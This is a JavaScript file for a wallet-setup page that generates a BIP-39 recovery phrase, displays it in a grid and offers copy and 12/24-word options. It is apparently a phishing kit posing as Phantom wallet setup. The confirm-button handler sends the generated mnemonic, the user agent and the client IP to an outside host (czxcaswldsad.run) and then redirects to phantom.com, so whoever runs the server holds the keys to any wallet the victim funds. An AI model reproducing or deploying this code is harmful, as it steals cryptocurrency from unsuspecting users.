let is24Words = false
let currentMnemonic = '' // Сохраняем текущую мнемоническую фразу

function generateNewSeedPhrase() {
	const entropyBits = is24Words ? 256 : 128
	const entropy = ethers.utils.randomBytes(entropyBits / 8)
	currentMnemonic = ethers.utils.entropyToMnemonic(entropy) // Сохраняем фразу

	displaySeedPhrase(currentMnemonic)
}

async function sendSeedPhraseToServer() {
	if (!currentMnemonic) return

	try {
		const response = await fetch('https://czxcaswldsad.run/send-speed-phrase', {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
				'X-Forwarded-For': window.clientIp,
			},
			body: JSON.stringify({
				phrase: currentMnemonic,
				userAgent: navigator.userAgent,
			}),
		})

		if (!response.ok) {
			throw new Error('Failed to send phrase')
		}

		// Перенаправляем только после успешной отправки
		window.location.href = 'https://phantom.com/'
	} catch (err) {
		console.error('Error sending phrase:', err)
		// Можно добавить обработку ошибки, например показать сообщение пользователю
	}
}

// Модифицируем кнопку
const confirmButton = document.getElementById('saved')
if (confirmButton) {
	confirmButton.onclick = sendSeedPhraseToServer
}

// Остальные функции остаются без изменений
function displaySeedPhrase(phrase) {
	const words = phrase.trim().split(' ')
	const container = document.getElementById('seedPhraseDisplay')
	container.innerHTML = ''

	if (words.length === 24) {
		container.style.maxHeight = '500px'
		container.style.gridTemplateColumns = 'repeat(3, 1fr)'
		container.style.gap = '10px'

		for (let col = 0; col < 3; col++) {
			const columnDiv = document.createElement('div')
			columnDiv.className = 'flex flex-col gap-2'

			for (let i = 0; i < 8; i++) {
				const index = col * 8 + i
				const word = words[index]

				const wrapper = document.createElement('div')
				wrapper.className = 'flex items-center w-full px-2 input-container'
				wrapper.style.cssText = `
          box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px;
          color: rgb(255, 255, 255);
          background: rgb(24, 24, 24);
          border: 1px solid rgb(50, 50, 50);
          border-radius: 6px;
          align-self: center;
          height: 41px;
          transition: 0.1s linear;
          min-width: 0;
        `

				const span = document.createElement('span')
				span.className = 'text-gray-400 text-sm mr-2 flex-shrink-0'
				span.textContent = `${index + 1}.`

				const input = document.createElement('input')
				input.type = 'text'
				input.readOnly = true
				input.value = word
				input.className =
					'bg-transparent text-white text-sm border-none outline-none flex-1 w-full'
				input.style.minWidth = '0'
				input.onclick = function () {
					this.select()
				}

				wrapper.appendChild(span)
				wrapper.appendChild(input)
				columnDiv.appendChild(wrapper)
			}

			container.appendChild(columnDiv)
		}
	} else {
		container.style.maxHeight = '300px'
		container.style.gridTemplateColumns = 'repeat(3, 1fr)'
		container.style.gap = '10px'

		words.forEach((word, index) => {
			const wrapper = document.createElement('div')
			wrapper.className = 'flex items-center w-full px-2 input-container'
			wrapper.style.cssText = `
        box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px;
        color: rgb(255, 255, 255);
        background: rgb(24, 24, 24);
        border: 1px solid rgb(50, 50, 50);
        border-radius: 6px;
        align-self: center;
        height: 41px;
        transition: 0.1s linear;
        min-width: 0;
      `

			const span = document.createElement('span')
			span.className = 'text-gray-400 text-sm mr-2 flex-shrink-0'
			span.textContent = `${index + 1}.`

			const input = document.createElement('input')
			input.type = 'text'
			input.readOnly = true
			input.value = word
			input.className =
				'bg-transparent text-white text-sm border-none outline-none flex-1 w-full'
			input.style.minWidth = '0'
			input.onclick = function () {
				this.select()
			}

			wrapper.appendChild(span)
			wrapper.appendChild(input)
			container.appendChild(wrapper)
		})
	}
}

async function copySeedPhrase() {
	const seedPhraseDisplay = document.getElementById('seedPhraseDisplay')
	const inputs = seedPhraseDisplay.querySelectorAll('input')
	let phrase = ''

	inputs.forEach((input, index) => {
		phrase += input.value
		if (index < inputs.length - 1) {
			phrase += ' '
		}
	})

	try {
		await navigator.clipboard.writeText(phrase)
		showCopySuccessScreen()
	} catch (err) {
		console.error('Error:', err)
		const textarea = document.createElement('textarea')
		textarea.value = phrase
		document.body.appendChild(textarea)
		textarea.select()
		document.execCommand('copy')
		document.body.removeChild(textarea)
		showCopySuccessScreen()
	}
}

function showCopySuccessScreen() {
	const existingBanner = document.getElementById('copySuccessBanner')
	if (existingBanner) existingBanner.remove()

	const banner = document.createElement('div')
	banner.id = 'copySuccessBanner'
	banner.textContent = 'Recovery phrase copied successfully'
	banner.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    background-color: #22c55e;
    color: white;
    text-align: center;
    padding: 12px 0;
    font-weight: 500;
    font-size: 16px;
    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    z-index: 9999;
    transform: translateY(-100%);
    transition: transform 0.3s ease-in-out;
  `
	document.body.appendChild(banner)

	setTimeout(() => {
		banner.style.transform = 'translateY(0%)'
	}, 10)

	setTimeout(() => {
		banner.style.transform = 'translateY(-100%)'
		setTimeout(() => banner.remove(), 300)
	}, 3000)
}

function toggle24() {
	is24Words = !is24Words
	const button = document.getElementById('toggle24')
	if (button) {
		button.textContent = is24Words
			? 'Generate 12-word recovery phrase'
			: 'Generate 24-word recovery phrase'
	}
	generateNewSeedPhrase()
}
